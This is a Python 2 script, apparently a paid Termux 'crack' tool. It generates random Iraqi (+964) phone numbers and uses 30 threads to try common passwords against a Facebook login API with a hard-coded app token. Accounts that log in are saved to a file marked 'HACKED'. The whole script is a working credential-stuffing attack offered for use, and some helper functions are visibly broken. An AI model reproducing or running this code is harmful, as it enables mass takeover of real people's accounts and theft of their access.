import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass

os.system('rm -rf .txt')

for n in range(9999):

    nmbr = random.randint(1111111, 9999999)

    sys.stdout = open('.txt', 'a')

    print nmbr

    sys.stdout.flush()

try:

    import requests

except ImportError:

    os.system('No Module Named Requests! type:pip2 install requests')

    os.system('Then type: python2 fbi.py')

try:

    import mechanize

except ImportError:

    os.system('No Module Named Mechanize! type:pip2 install mechanize')

    time.sleep(1)

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize

from multiprocessing.pool import ThreadPool

from requests.exceptions import ConnectionError

from mechanize import Browser

reload(sys)

sys.setdefaultencoding('utf8')

br = mechanize.Browser()

br.set_handle_robots(False)

br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)

br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():

    print 'Thanks.'

    os.sys.exit()

def acak(b):

    w = 'ahtdzjc'

    d = ''

    for i in x:

        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)

def cetak(b):

    w = 'ahtdzjc'

    for i in w:

        j = w.index(i)

        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'

    x = x.replace('!0', '\x1b[0m')

    sys.stdout.write(x + '\n')

def jalan(z):

    for e in z + '\n':

        sys.stdout.write(e)

        sys.stdout.flush()

        time.sleep(0.1)

def tik():

    titik = ['.   ', '..  ', '... ']

    for o in titik:

        print '\r\x1b[1;90mTKAYA BOSTA \x1b[1;90m' + o,

        sys.stdout.flush()

        time.sleep(1)

def psb(z):

    for e in z + '\n':

        sys.stdout.write(e)

        sys.stdout.flush()

        time.sleep(0.03)

back = 0

successful = []

oks = []

id = []

cpb = []

vulnot = '\x1b[31mNot Vuln'

vuln = '\x1b[32mVuln'

os.system('clear')

logo = """\033[92m ________  ______   _____




 /$$$$$$   /$$    /$$$$$$ 
|_  $$_/ /$$$$   /$$__  $$
  | $$  |_  $$  | $$  \__/
  | $$    | $$  | $$$$$$$ 
  | $$    | $$  | $$__  $$
  | $$    | $$  | $$  \ $$
 /$$$$$$ /$$$$$$|  $$$$$$/
|______/|______/ \______/ 
                          
                          
                          

                                                
 
\033[90m-------------------------------------------------

\033[91mAM - TOOLA - LALAYAN - IBRAHIM - DRUSTKARWA 

\033[91mTOOL VIP 5$

\033[93mCHANNEL / @HACKERTOLL11
\033[93mCHANNEL CHAT / @termux99a

\033[90m--------------------------------------------------- 
"""
logo2 = """\033[92m ________  ______   _____        


 /$$$$$$   /$$    /$$$$$$ 
|_  $$_/ /$$$$   /$$__  $$
  | $$  |_  $$  | $$  \__/
  | $$    | $$  | $$$$$$$ 
  | $$    | $$  | $$__  $$
  | $$    | $$  | $$  \ $$
 /$$$$$$ /$$$$$$|  $$$$$$/
|______/|______/ \______/ 
                                                                        

_______________________________________"""
CorrectUsername = 'ibrahim16'

CorrectPassword = 'i16'

os.system('clear')

print logo2

loop = 'true'

while loop == 'true':

    username = raw_input('\x1b[1;90m\xe2\x9e\xa3 Username : ')

    if username == CorrectUsername:

        password = raw_input('\x1b[1;90m\xe2\x9e\xa3 Password : ')

        if password == CorrectPassword:

            print '\x1b[1;92m[\xe2\x9c\x93] Logged in successfully as' + username

            time.sleep(0.5)

            loop = 'false'

        else:

            print 'password XALAT'

    else:

        print 'Username XALATA'

def lisensi():

    os.system('clear')

    menu()

def menu():

    os.system('clear')

    print logo

    print '\x1b[1;92m[1]\x1b[1;90m CRACK NUMBER KURDISTAN  \033[92m[NO CECKPOINT] \033[90m'

    print '\n\x1b[1;92m[0]\x1b[1;90mDARCHON           '

    print '\x1b[1;97m--------------------------------------------------\n'

    action()

def action():

    global cpb

    global oks

    peak = raw_input('\n\x1b[1;93mHALBCHERA : \x1b[1;93m')

    if peak == '':

        print '[!] Fill In Correctly'

        action()

    elif peak == '1':

        os.system('clear')

        print logo

        print '\x1b[1;90m770 771 772 773 774 750 751 752-753 754 780 781 782 783 784' + '\n'
        
        try:

            c = raw_input('\x1b[1;93mSARATAKAY CHE BET  : ')

            k = '+964'

            idlist = '.txt'

            for line in open(idlist, 'r').readlines():

                id.append(line.strip())

        except IOError:

            print '[!] File Not Found'

            raw_input('\n[ Back ]')

            menu()
        
    else:

        print '[!] Fill In Correctly'

        action()

    xxx = str(len(id))

    psb('[\xe2\x9c\x93] HAMU RAQAMAKAN ' + xxx)

    time.sleep(0.5)

    psb('[\xe2\x9c\x93] CRACK DASTPE KRD')

    time.sleep(0.5)

    psb('[\xe2\x9c\x93] TKAYA BOSTA TA CRACK DAKA...')

    time.sleep(0.5)

    psb('[!] BO WASTAN DNE TOOLAKA  CTRL Then Press z DAGRA')

    time.sleep(0.5)

    print '\x1b[1;90m--------------------------------------------'

    def main(arg):

        user = arg

        try:

            os.mkdir('Lost')

        except OSError:

            pass

        try:

            pass1 = '1234512345'

            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')

            q = json.load(data)

            if 'access_token' in q:

                print '\x1b[1;92m|HACKED|\x1b[1;90mNUMBER|  ' + k + c + user + '  \x1b[1;90mPASS|  ' + pass1

                okb = open('anggaxd/clone.txt', 'a')

                okb.write(k + c + user + pass1 + '\n')

                okb.close()

                oks.append(c + user + pass1)

            else:

                pass2 = user

                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')

                q = json.load(data)

                if 'access_token' in q:

                    print '\x1b[1;92m|HACKED|\x1b[1;90mNUMBER|  ' + k + c + user + '  \x1b[1;90mPASS|  ' + pass2

                    okb = open('anggaxd/clone.txt', 'a')

                    okb.write(k + c + user + pass2 + '\n')

                    okb.close()

                    oks.append(c + user + pass2)

                else:

                    pass3 = '1122334455'

                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')

                    q = json.load(data)

                    if 'access_token' in q:

                        print '\x1b[1;92m|HACKED|\x1b[1;90mNUMBER|  ' + k + c + user + '  \x1b[1;90mPASS|  ' + pass3

                        okb = open('anggaxd/clone.txt', 'a')

                        okb.write(k + c + user + pass3 + '\n')

                        okb.close()

                        oks.append(c + user + pass3)

                    else:

                        pass4 = '1234554321'

                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')

                        q = json.load(data)

                        if 'access_token' in q:

                            print '\x1b[1;92m|HACKED|\x1b[1;90mNUMBER|  ' + k + c + user + '  \x1b[1;90mPASS|  ' + pass4

                            okb = open('anggaxd/clone.txt', 'a')

                            okb.write(k + c + user + pass4 + '\n')

                            okb.close()

                            oks.append(c + user + pass4)

                        else:

                            pass5 = '1122334455'

                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')

                            q = json.load(data)

                            if 'access_token' in q:

                                print '\x1b[1;92m|HACKED|\x1b[1;90mNUMBER|  ' + k + c + user + '  \x1b[1;90mPASS|  ' + pass5

                                okb = open('anggaxd/clone.txt', 'a')

                                okb.write(k + c + user + pass5 + '\n')

                                okb.close()

                                oks.append(c + user + pass5)

                            else:

                                pass6 = '123456123456'

                                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')

                                q = json.load(data)

                                if 'access_token' in q:

                                    print '\x1b[1;92m|HACKED|\x1b[1;90mNUMBER|  ' + k + c + user + '  \x1b[1;90mPASS|  ' + pass6

                                    okb = open('anggaxd/clone.txt', 'a')

                                    okb.write(k + c + user + pass6 + '\n')

                                    okb.close()

                                    oks.append(c + user + pass6)

                                else:

                                    pass7 = '123456654321'

                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')

                                    q = json.load(data)

                                    if 'access_token' in q:

                                        print '\x1b[1;92m|HACKED|\x1b[1;90mNUMBER|  ' + k + c + user + '  \x1b[1;90mPASS|  ' + pass7

                                        okb = open('anggaxd/clone.txt', 'a')

                                        okb.write(k + c + user + pass7 + '\n')

                                        okb.close()

                                        oks.append(c + user + pass7)

                                    else:

                                        pass8 = '112233445566'

                                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')

                                        q = json.load(data)

                                        if 'access_token' in q:

                                            print '\x1b[1;92m|HACKED|\x1b[1;90mNUMBER|  ' + k + c + user + '  \x1b[1;90mPASS|  ' + pass8

                                            okb = open('anggaxd/clone.txt', 'a')

                                            okb.write(k + c + user + pass8 + '\n')

                                            okb.close()

                                            oks.append(c + user + pass8)

        except:

            pass

    p = ThreadPool(30)

    p.map(main, id)

    print '\x1b[1;97m--------------------------------------------------'

    print '[\xe2\x9c\x93] HACK TAWAW BW..'

    print '[\xe2\x9c\x93] HAMU HACKED : ' + str(len(oks)) + '/' + str(len(cpb))

    print '[\xe2\x9c\x93] SAVE BU  : anggaxd/clone.txt'

    raw_input('\n\x1b[1;90m[\x1b[1;90mBack\x1b[1;90m]')

    menu()

if __name__ == '__main__':

    menu()
